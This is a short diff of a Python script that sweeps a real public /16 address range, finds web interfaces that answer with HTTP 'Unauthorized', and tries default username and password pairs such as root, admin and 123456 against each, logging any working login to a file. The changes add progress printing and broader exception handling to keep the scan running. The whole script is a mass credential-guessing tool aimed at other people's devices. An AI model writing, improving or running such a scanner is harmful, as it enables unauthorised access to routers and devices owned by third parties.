@@ -6,6 +6,7 @@ user = ['root','admin']
 password = ['root','admin','123456']
 ips = IPv4Network('186.192.0.0/16')
 for ip in ips:
+    print(ip)
     try:
         response = requests.get('http://' + str(ip), timeout=5.0)
         if response.reason == 'Unauthorized':
@@ -17,5 +18,9 @@ for ip in ips:
                         f.write('IP: {} User: {} Password: {}\n'.format(ip,u,p))
                         f.close()
     except requests.exceptions.ConnectionError:
+        continue
+    except requests.exceptions.ReadTimeout:
+        continue
+    except Exception:
         continue
 # response = get('http://192.168.0.1', auth=HTTPBasicAuth('admin','admin'))
